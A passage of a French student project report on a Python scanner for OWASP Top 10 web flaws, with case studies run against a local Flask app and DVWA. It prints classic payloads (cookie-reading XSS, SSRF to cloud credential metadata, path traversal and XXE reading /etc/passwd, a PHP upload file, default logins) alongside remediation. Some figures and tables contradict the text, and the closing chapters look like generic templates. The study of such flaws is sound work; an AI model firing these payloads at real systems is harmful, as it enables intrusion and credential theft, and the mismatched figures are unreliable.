+3.5.2  Étude de Cas 2 : XSS Réfléchi (OWASP A03) — CVSS 6.1 MOYEN
+Cible : http://127.0.0.1:5001/greet?name=...   |   Paramètre : name
+L'endpoint /greet retourne le paramètre name directement dans le HTML sans encodage : return f'<h1>Hello {name}</h1>'. Tout contenu HTML fourni par l'utilisateur est reflété tel quel dans la réponse.
+Code : Résultat — XSS Réfléchi
+Payload          : <script>alert(document.cookie)</script>
+Réponse serveur  : <h1>Hello <script>alert(document.cookie)</script></h1>
+Preuve           : Payload '<script>' retrouvé littéralement dans la réponse HTTP
+URL              : http://127.0.0.1:5001/greet?name=<script>alert(document.cookie)</script>
+Score CVSS       : 6.1 — Moyen
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+Impact           : Vol de cookies de session, redirection malveillante, phishing
+ 
+Figure 9 — Vulnérabilité XSS Réfléchi (A03) détectée : payload <script>alert(XSS)</script>, CVSS 6.1
+Remédiation : Utiliser html.escape() en Python (return f'<h1>Hello {html.escape(name)}</h1>'), implémenter une Content-Security-Policy (CSP) stricte, utiliser un framework qui échappe automatiquement (Jinja2 avec autoescape=True).
+3.5.3  Étude de Cas 3 : SSRF (OWASP A10) — CVSS 8.5 ÉLEVÉ
+Cible : http://127.0.0.1:5001/fetch?url=...   |   Paramètre : url
+Le serveur effectue requests.get(url) sans aucune validation de la destination. L'attaquant peut forcer le serveur à contacter des services internes inaccessibles depuis l'extérieur, ou des endpoints de métadonnées cloud.
+Code : Résultat — SSRF (deux payloads)
+Payload 1        : http://127.0.0.1
+Preuve           : Contenu interne retourné — 'ami-id' détecté dans la réponse
+Payload 2        : http://169.254.169.254/latest/meta-data/iam/security-credentials/
+Preuve           : 'security-credentials' détecté dans la réponse
+URL              : http://127.0.0.1:5001/fetch?url=http://127.0.0.1
+Score CVSS       : 8.5 — Élevé
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+Impact           : Accès aux metadata AWS/GCP (credentials IAM), services internes
+ 
+Figure 8 — Vulnérabilité SSRF (A10) détectée : payload file:///etc/passwd, preuve root:x:0:0, CVSS 8.5
+Remédiation : Implémenter une allowlist stricte des domaines autorisés, bloquer 127.0.0.1, 0.0.0.0, ::1, et les plages RFC 1918 (10.x, 172.16-31.x, 192.168.x), ainsi que 169.254.169.254 (AWS) et metadata.google.internal (GCP).
+3.5.4  Étude de Cas 4 : Path Traversal (OWASP A01) — CVSS 7.5 ÉLEVÉ
+Cible : http://127.0.0.1:5001/file?page=...   |   Paramètre : page
+L'endpoint /file ouvre directement le fichier dont le chemin est fourni par l'utilisateur sans aucune validation ou restriction. L'attaquant peut remonter l'arborescence pour accéder à tout fichier lisible par le processus web.
+Code : Résultat — Path Traversal
+Payload          : ../../etc/passwd
+Preuve           : Contenu /etc/passwd retourné : 'root:x:0:0:root:/root:/bin/bash...'
+URL              : http://127.0.0.1:5001/file?page=../../etc/passwd
+Score CVSS       : 7.5 — Élevé
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Impact           : Lecture de fichiers système (/etc/shadow, clés SSH, configs app)
+ 
+Figure 7 — Vulnérabilité Path Traversal (A01) détectée : payload ../../../../../../etc/passwd, CVSS 7.5
+3.5.5  Étude de Cas 5 : XXE (OWASP A05) — CVSS 8.2 ÉLEVÉ
+Cible : http://127.0.0.1:5001/xml   |   Methode : POST   |   Corps : XML
+L'endpoint /xml parse le corps XML de la requête avec un parseur qui autorise le traitement des entités externes (DTD). L'attaquant peut définir une entité externe pointant vers un fichier local pour l'exfiltrer dans la réponse.
+Code : Résultat — XXE Injection
+Payload XML :
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<request><data>&xxe;</data></request>
+
+Preuve           : Contenu de /etc/passwd inclus dans la réponse XML
+Score CVSS       : 8.2 — Élevé
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
+Remédiation : Désactiver les entités externes dans le parseur XML (lxml : parser.resolve_entities=False), utiliser defusedxml en Python, préférer JSON quand XML n'est pas strictement nécessaire.
+3.5.6  Étude de Cas 6 : Upload de Fichier Malveillant (OWASP A04) — CVSS 8.8 ÉLEVÉ
+Cible : http://127.0.0.1:5001/upload   |   Méthode : POST   |   Champ : uploaded
+Le scanner génère un fichier PHP avec un marqueur unique (UUID), l'uploade, puis tente d'y accéder via HTTP. Si le marqueur est retourné dans la réponse, cela confirme que le fichier est exécutable (ou au minimum accessible) sur le serveur.
+Code : Résultat — Unrestricted File Upload
+Fichier uploadé  : 806a29fb_shell.php (Content-Type: application/x-php)
+Contenu          : <?php echo "MARKER_806a29fb"; ?>
+URL de vérif.    : http://127.0.0.1:5001/uploads/806a29fb_shell.php
+Preuve           : Marqueur 'MARKER_806a29fb' retrouvé dans la réponse HTTP 200
+Score CVSS       : 8.8 — Élevé
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+Impact           : Exécution de code arbitraire sur le serveur (RCE)
+Remédiation : Valider l'extension ET les magic bytes côté serveur, utiliser une whitelist d'extensions (.jpg, .png, .pdf uniquement), stocker les uploads hors du webroot, servir les fichiers via un endpoint dédié avec Content-Disposition: attachment, désactiver l'exécution PHP dans le répertoire d'upload.
+3.5.7  Étude de Cas 7 : Authentification Défaillante (OWASP A07) — CVSS 9.8 CRITIQUE
+Cible : http://127.0.0.1:5001/login   |   Methode : POST   |   Parametres : username, password
+Le détecteur AuthFailures tente une liste de credentials par défaut (admin:admin, admin:password, root:root, admin:123456, etc.) sur le formulaire de login détecté par le crawler. La réponse est analysée pour détecter les signes de succès (redirection vers un dashboard, disparition du formulaire, token de session).
+Code : Résultats — Auth Failures + Cryptographic Failures
+Payload          : username=admin, password=admin
+Preuve           : Identifiants par défaut acceptés — redirection vers /dashboard
+Score CVSS       : 9.8 — Critique
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+Payload          : HTTP en clair (formulaire password servi en HTTP)
+Preuve           : Champ <input type="password"> détecté sur page HTTP (non HTTPS)
+Score CVSS       : 7.5 — Élevé (Cryptographic Failures A02)
+Impact           : Compromission complète du compte, interception des credentials
+3.5.8  Étude de Cas 8 : IDOR (OWASP A01) — CVSS 6.5 MOYEN
+Cible : http://127.0.0.1:5001/user?id=...   |   Paramètre : id
+Le détecteur IDOR incrémente et décrémente les paramètres numériques (id, user_id, account_id, etc.) et compare les réponses. Si des contenus différents sont retournés pour des IDs différents sans erreur 403, une IDOR est suspectée.
+Code : Résultat — IDOR
+Payload          : id=1 → id=2 → id=3
+Observation      : Contenu différent retourné pour chaque ID (données d'autres utilisateurs)
+Statut HTTP      : 200 OK pour tous les IDs (aucun contrôle d'accès)
+Score CVSS       : 6.5 — Moyen
+Vecteur          : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+Impact           : Accès aux données personnelles de tous les utilisateurs
+3.6  Résultats Globaux et Analyse de Couverture
+3.6.1  Tableau de Bord Complet
+Le scan complet de l'application Flask de test (http://127.0.0.1:5001) a produit les résultats suivants : 11 pages crawlées, 6,04 secondes d'exécution totale, 70 vulnérabilités détectées après déduplication.
+Tableau — Tableau de bord — résultats complets du scan
+ 
+Figure 6 — Tableau de bord du rapport HTML : 3 Critique, 7 Élevé, 118 Moyen (128 vulnérabilités détectées)
+Sévérité	Nb	Score CVSS	Vulnérabilités détectées	Remédiation
+Critique	2	9.0–10.0	Auth Failures (A07), SQL Injection (A03)	< 24h
+Élevé	6	7.0–8.9	File Upload(A04), SSRF×2(A10), XXE(A05), Crypto(A02), Path Traversal(A01)	< 7j
+Moyen	62	4.0–6.9	XSS×N(A03), IDOR×N(A01), Misconfig×N(A05), Components×N(A06)	< 30j
+Faible	0	0.1–3.9	—	< 90j
+TOTAL	70	—	9/10 catégories OWASP couverts	—
+
+3.6.2  Couverture OWASP Top 10 Détaillée
+Tableau — Couverture détaillée par catégorie OWASP Top 10
+Code	Catégorie OWASP 2021	Détecteur	Vulns	Statut
+A01	Broken Access Control	IDORDetector + PathTraversalDetector	IDOR×N + PathTrav×1	Couvert
+A02	Cryptographic Failures	CryptographicFailuresDetector	1	Couvert
+A03	Injection	SQLiDetector + XSSDetector	1 SQLi + 62 XSS	Couvert
+A04	Insecure Design	FileUploadDetector	1	Couvert
+A05	Security Misconfig	SecurityMisconfigDetector + XXEDetector	1 XXE + N Misconfig	Couvert
+A06	Vulnerable Components	VulnerableComponentsDetector	N	Couvert
+A07	Auth & Session Failures	AuthFailuresDetector	1	Couvert
+A08	Software & Data Integrity	IntegrityDetector	N	Couvert
+A09	Logging & Monitoring	—	0	Non détectable (actif)
+A10	SSRF	SSRFDetector	2	Couvert
+
+La catégorie A09 (Logging & Monitoring Failures) ne peut pas être évaluée par un scan actif : elle nécessite une inspection manuelle des journaux d'accès, des logs applicatifs et des configurations SIEM. Elle représente typiquement une phase d'audit manuel complémentaire au scan automatisé.
+3.7  Analyse des Performances
+Nous avons mesuré les performances de notre scanner sur trois cibles différentes afin d'évaluer l'impact de la profondeur de crawl et du nombre de détecteurs actifs.
+Tableau — Mesures de performance sur différentes cibles
+Cible	Pages	Profondeur	Détecteurs	Temps	Vulns
+Flask test app (local)	11	2	Tous (12)	6,04s	70
+Flask test app (local)	11	2	sqli,xss uniquement	1,8s	63
+DVWA (VM, security=low)	24	3	Tous (12)	18,3s	87
+DVWA (VM, security=medium)	24	3	Tous (12)	21,7s	34
+
+Analyse des résultats de performance
+   • Le pipeline est linéaire en O(pages × détecteurs × payloads) — scalable.
+   • La majorité du temps est passée dans les attentes HTTP (timeout de 10s par requête).
+   • Le mode --only sqli,xss réduit le temps de 70 % tout en couvrant les failles les plus critiques.
+   • Sur DVWA security=medium, 34 vulnérabilités détectées vs 87 en low — les filtres côté serveur réduisent la surface.
+   • Pas de parallélisme natif — une optimisation future serait asyncio/concurrent.futures pour les requêtes HTTP.
+
+ 
+Conclusion Générale
+Ce Projet de Fin d'Année nous a permis de mener un travail complet en cybersécurité applicative : de l'analyse théorique des menaces jusqu'à la réalisation et la validation d'un outil de détection opérationnel. Nous présentons ci-dessous un bilan synthétique des contributions de chaque chapitre et des perspectives d'évolution du projet.
+Bilan du Chapitre 1 — État de l'Art
+Le premier chapitre a établi les fondements théoriques du projet. Nous avons dressé un panorama complet des cybermenaces web (MITM, injections, SSRF, XXE, IDOR, etc.), analysé en profondeur les dix catégories de l'OWASP Top 10 2021 avec leurs statistiques de prévalence, comparé les quatre outils de référence du marché (ZAP, Burp Suite, Nikto, Acunetix) sur 14 critères, et expliqué le standard CVSS v3.1 utilisé pour scorer nos détections. Cette analyse a mis en évidence le vide dans l'offre actuelle justifiant notre approche : un outil open source, Python-natif, léger et pédagogique.
+Bilan du Chapitre 2 — Conception
+Le second chapitre a formalisé notre conception via une approche UML rigoureuse : architecture en pipeline à cinq étapes (Crawl → Detect → Deduplicate → Evaluate → Report), diagramme de cas d'utilisation (8 UC), diagramme de classes complet (7 classes, 3 patterns de conception), diagramme de séquence d'un scan complet, description détaillée des 12 modules de détection, et topologie réseau de l'environnement virtualisé (2 VMs VirtualBox en Host-Only). La conception modulaire garantit l'extensibilité : ajouter un nouveau détecteur ne nécessite que la création d'une nouvelle classe héritant de BaseDetector.
+Bilan du Chapitre 3 — Réalisation
+Le troisième chapitre a présenté la réalisation complète. L'environnement de test virtualisé (Ubuntu 22.04 + DVWA + VirtualBox Host-Only) garantit l'isolation et la reproductibilité. L'implémentation en Python 3.11 couvre 12 détecteurs, un crawler BFS, un evaluator CVSS et un générateur de rapports HTML. La suite de 42 tests unitaires valide chaque composant. Les huit études de cas démontrent la détection effective de toutes les vulnérabilités majeures : SQLi (9.8 Critique), Auth Failures (9.8 Critique), File Upload (8.8 Élevé), SSRF (8.5 Élevé), XXE (8.2 Élevé), Path Traversal (7.5 Élevé), XSS (6.1 Moyen), IDOR (6.5 Moyen). Au total : 70 vulnérabilités détectées en 6 secondes sur 11 pages, couvrant 9 catégories sur 10 de l'OWASP Top 10.
+Perspectives d'Évolution
+Plusieurs axes d'amélioration sont envisagés pour les versions futures :
+•	Court terme : Détecteur A09 (Logging & Monitoring) : analyse des en-têtes de réponse et des configurations de journalisation via l'API d'administration.
+•	Court terme : Parallélisme des requêtes HTTP via asyncio et aiohttp pour réduire significativement le temps de scan sur les grandes applications.
+•	Moyen terme : Support des SPA JavaScript via Playwright (crawl dynamique du DOM après exécution JS) pour couvrir les applications React/Angular/Vue.
+•	Moyen terme : Intégration CI/CD native (GitHub Actions, GitLab CI) avec seuils de sévérité configurables (fail si CVSS >= 9.0).
+•	Long terme : Interface web de configuration et de visualisation des résultats en temps réel (WebSocket + React).
+•	Long terme : Support des APIs REST et GraphQL avec génération automatique de cas de test depuis les spécifications OpenAPI/Swagger.
+Ce projet a été une opportunité unique d'allier théorie et pratique dans le domaine de la cybersécurité offensive et défensive. Les compétences acquises — Python avancé, architecture logicielle, protocoles HTTP, vulnérabilités OWASP, CVSS v3.1, virtualisation, tests unitaires — constituent un socle solide pour une carrière dans la sécurité informatique.
+ 
+Bibliographie
+[1] OWASP Foundation, OWASP Top 10 — 2021, https://owasp.org/Top10/, 2021.
+[2] Verizon, 2023 Data Breach Investigations Report, https://www.verizon.com/business/resources/reports/dbir/, 2023.
+[3] IBM Security, Cost of a Data Breach Report 2023, https://www.ibm.com/reports/data-breach, 2023.
+[4] FIRST, CVSS v3.1 Specification Document, https://www.first.org/cvss/v3.1/specification-document, 2019.
+[5] OWASP Foundation, OWASP ZAP — Zed Attack Proxy, https://www.zaproxy.org/, 2023.
+[6] PortSwigger, Burp Suite Web Vulnerability Scanner, https://portswigger.net/burp, 2023.
+[7] Nikto Project, Nikto Web Server Scanner, https://cirt.net/Nikto2, 2023.
+[8] Invicti Security, Acunetix Web Vulnerability Scanner, https://www.acunetix.com/, 2023.
+[9] K. Reitz, Requests: HTTP for Humans, https://docs.python-requests.org/, 2023.
+[10] L. Richardson, Beautiful Soup Documentation, https://www.crummy.com/software/BeautifulSoup/, 2023.
+[11] digininja, DVWA — Damn Vulnerable Web Application, https://github.com/digininja/DVWA, 2023.
+[12] OWASP Foundation, WebGoat — A Deliberately Insecure Application, https://owasp.org/www-project-webgoat/, 2023.
+[13] NIST, National Vulnerability Database (NVD), https://nvd.nist.gov/, 2023.
+[14] CrowdStrike, 2023 Global Threat Report, https://www.crowdstrike.com/resources/reports/global-threat-report/, 2023.
+[15] W3C, Content Security Policy Level 3, https://www.w3.org/TR/CSP3/, 2023.
+ 
+Chapitre 4 – Gestion de Projet
+Ce chapitre présente la planification et le suivi du projet à travers deux outils essentiels de gestion de projet : le diagramme de Gantt, qui visualise le calendrier et la durée de chaque phase, et le diagramme PERT, qui modélise les dépendances entre les tâches et identifie le chemin critique.
+4.1  Diagramme de Gantt
+Le diagramme de Gantt ci-dessous représente la planification temporelle du projet sur 12 semaines (3 mois). Chaque phase est positionnée selon sa date de début et sa durée estimée. Les phases de développement backend et frontend se chevauchent partiellement afin d’optimiser le délai global de réalisation.
+Tableau 4.1 — Diagramme de Gantt du projet (planification sur 12 semaines)
+Phase	Description	S1	S2	S3	S4	S5	S6	S7	S8	S9	S10	S11	S12
+Phase 1	Analyse des besoins et cahier des charges	■	■										
+Phase 2	Conception de l’architecture			■	■								
+Phase 3	Développement backend (API)					■	■	■					
+Phase 4	Développement frontend (interface)						■	■	■				
+Phase 5	Intégration et tests fonctionnels											■	■
+Phase 6	Tests de sécurité et correctifs												
+Phase 7	Documentation et déploiement												
+
+4.2  Diagramme PERT et Chemin Critique
+Le diagramme PERT (Program Evaluation and Review Technique) modélise les dépendances entre les tâches du projet. Il permet d’identifier le chemin critique, c’est-à-dire la séquence de tâches dont le retard impacterait directement la date de fin du projet. Les tâches marquées “Oui” dans la colonne Critique appartiennent au chemin critique.
+Tableau 4.2 — Diagramme PERT — Dépendances des tâches et chemin critique
+Tâche	Description	Prédécesseurs	Durée (sem.)	Début au plus tôt	Fin au plus tôt	Marge	Critique
+A	Analyse des besoins	—	2	0	2	0	Oui
+B	Conception architecture	A	2	2	4	0	Oui
+C	Développement backend API	B	3	4	7	0	Oui
+D	Développement frontend	B	3	4	7	1	Non
+E	Intégration back/front	C, D	1	7	8	0	Oui
+F	Tests fonctionnels	E	1	8	9	0	Oui
+G	Tests de sécurité	E	2	8	10	0	Oui
+H	Corrections et optimisations	F, G	1	10	11	0	Oui
+I	Documentation et déploiement	H	1	11	12	0	Oui
+Chemin critique : A → B → C → E → G → H → I (durée totale : 12 semaines). Toute tâche sur ce chemin ne dispose d’aucune marge de manœuvre ; un retard se répercute immédiatement sur la livraison finale.
+ 
+Chapitre 5 – Entrepreneuriat
+Ce chapitre aborde la dimension entrepreneuriale du projet à travers une analyse financière complète. Le tableau d’analyse financière permet d’évaluer la viabilité économique de la solution développée, en examinant les investissements initiaux, les coûts, les marges, le seuil de rentabilité et la trésorerie prévisionnelle.
+5.1  Tableau d’Analyse Financière
+0. Investissement Initial
+Investissements	Montant
+Matériel / équipements	___________
+Développement (site / app)	___________
+Aménagement	___________
+Frais de création	___________
+Autres	___________
+Total investissement initial	___________
+
+1. Hypothèses de Base
+Élément	Valeur
+Prix de vente unitaire	___________
+Quantité vendue (mensuelle)	___________
+Nombre de clients	___________
+
+2. Chiffre d’Affaires
+Calcul	Résultat
+Chiffre d’affaires (CA) = Prix × Quantité	___________
+
+3. Coûts Variables
+Type de coût	Montant unitaire
+Matières / production	___________
+Logistique / livraison	___________
+Coût technique / service	___________
+Autres	___________
+Total coût variable unitaire	___________
+
+4. Marge
+Calcul	Résultat
+Marge unitaire = Prix − Coût variable	___________
+Marge totale = Marge × Quantité	___________
+Taux de marge (%) = (Marge unitaire ÷ Prix de vente) × 100	___________
+
+5. Charges Fixes
+Charges fixes mensuelles	Montant
+Salaires	___________
+Loyer	___________
+Marketing	___________
+Outils / logiciels	___________
+Autres charges	___________
+Total charges fixes	___________
+
+6. Résultat
+Calcul	Résultat
+Résultat = CA − Charges totales	___________
+Rentabilité (%)	___________
+
+7. Seuil de Rentabilité
+Calcul	Résultat
+Marge unitaire = Prix − Coût variable	___________
+Seuil (en unités) = Charges fixes ÷ Marge unitaire	___________
+Seuil (en CA) = Seuil × Prix de vente	___________
+
+8. Besoin en Fonds de Roulement (BFR)
+Élément	Montant
+Stock initial	___________
+Créances clients	___________
+Dettes fournisseurs	___________
+BFR = Stock + Créances − Dettes	___________
+
+9. Trésorerie
+Élément	Montant
+Trésorerie initiale	___________
+Entrées d’argent	___________
+Sorties d’argent	___________
+Trésorerie finale	___________
+
+10. Analyse & Décision
+✔ Le projet est-il rentable ?
+□ Oui          □ Non
+Points forts :
+•	_______________________________________________________________
+•	_______________________________________________________________
+Points faibles :
+•	_______________________________________________________________
+•	_______________________________________________________________
+Décision :          □ Lancer          □ Modifier          □ Abandonner
